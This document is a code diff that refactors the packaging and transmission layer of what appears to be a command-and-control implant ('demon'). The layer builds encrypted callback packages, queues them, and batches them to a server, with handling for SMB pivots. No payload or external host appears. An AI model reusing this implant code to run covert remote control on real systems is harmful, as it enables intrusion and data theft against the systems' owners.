@@ -134,7 +134,6 @@ VOID PackageAddWString( PPACKAGE package, PWCHAR data )
     PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
 }
 
-// For callback to server
 PPACKAGE PackageCreate( UINT32 CommandID )
 {
     PPACKAGE Package = NULL;
@@ -146,24 +145,15 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     Package->CommandID = CommandID;
     Package->Encrypt   = TRUE;
     Package->Destroy   = TRUE;
+    Package->Included  = FALSE;
     Package->Next      = NULL;
 
     return Package;
 }
 
-// For callback to server
 PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
 {
-    PPACKAGE Package = NULL;
-
-    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
-    Package->Length    = 0;
-    Package->RequestID = Instance.CurrentRequestID;
-    Package->CommandID = CommandID;
-    Package->Encrypt   = TRUE;
-    Package->Destroy   = TRUE;
-    Package->Next      = NULL;
+    PPACKAGE Package = PackageCreate( CommandID );
 
     PackageAddInt32( Package, 0 ); // package length
     PackageAddInt32( Package, DEMON_MAGIC_VALUE );
@@ -174,18 +164,11 @@ PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
     return Package;
 }
 
-// For callback to server
-PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
+PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
 {
-    PPACKAGE Package = NULL;
+    PPACKAGE Package = PackageCreate( CommandID );
 
-    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
-    Package->Length    = 0;
     Package->RequestID = RequestID;
-    Package->CommandID = CommandID;
-    Package->Encrypt   = TRUE;
-    Package->Destroy   = TRUE;
 
     return Package;
 }
@@ -193,24 +176,22 @@ PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
 VOID PackageDestroy(
     IN PPACKAGE Package
 ) {
-    if ( ! Package ) {
-        return;
+    if ( Package )
+    {
+        if ( Package->Buffer )
+        {
+            MemSet( Package->Buffer, 0, Package->Length );
+            Instance.Win32.LocalFree( Package->Buffer );
+            Package->Buffer = NULL;
+        }
+
+        MemSet( Package, 0, sizeof( PACKAGE ) );
+        Instance.Win32.LocalFree( Package );
+        Package = NULL;
     }
-
-    if ( ! Package->Buffer ) {
-        PUTS_DONT_SEND( "Package Buffer empty" )
-        return;
-    }
-
-    MemSet( Package->Buffer, 0, Package->Length );
-    Instance.Win32.LocalFree( Package->Buffer );
-    Package->Buffer = NULL;
-
-    MemSet( Package, 0, sizeof( PACKAGE ) );
-    Instance.Win32.LocalFree( Package );
-    Package = NULL;
 }
 
+// used to send the demon's metadata
 BOOL PackageTransmitNow(
     IN OUT PPACKAGE Package,
     OUT    PVOID*   Response,
@@ -262,6 +243,7 @@ BOOL PackageTransmitNow(
     return Success;
 }
 
+// don't transmit right away, simply store the package. Will be sent when PackageTransmitAll is called
 VOID PackageTransmit(
     IN PPACKAGE Package
 ) {
@@ -282,14 +264,14 @@ VOID PackageTransmit(
     }
 }
 
+// transmit all stored packages in a single request
 BOOL PackageTransmitAll(
     OUT    PVOID*   Response,
     OUT    PSIZE_T  Size
 ) {
-    AESCTX AesCtx    = { 0 };
-    BOOL   Success   = FALSE;
-    UINT32 Padding   = 0;
-    BUFFER   Buffer  = { 0 };
+    AESCTX   AesCtx  = { 0 };
+    BOOL     Success = FALSE;
+    UINT32   Padding = 0;
     PPACKAGE Package = NULL;
     PPACKAGE Pkg     = Instance.Packages;
     PPACKAGE Entry   = NULL;
@@ -298,7 +280,7 @@ BOOL PackageTransmitAll(
 #if TRANSPORT_SMB
     // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
     // so if we don't having nothing to send, simply exit
-    if ( ! Pkg )
+    if ( ! Instance.Packages )
         return TRUE;
 #endif
 
@@ -312,6 +294,7 @@ BOOL PackageTransmitAll(
         PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
         Pkg->Included = TRUE;
 
+        // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
         if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
             break;
 
@@ -393,14 +376,14 @@ BOOL PackageTransmitAll(
             }
             else
             {
-                Prev = Entry;
+                Prev  = Entry;
                 Entry = Entry->Next;
             }
         }
     }
     else
     {
-        // the request failed, mark all packages as not included for nextime
+        // the request failed, mark all packages as not included for next time
         while ( Entry )
         {
             Entry->Included = FALSE;
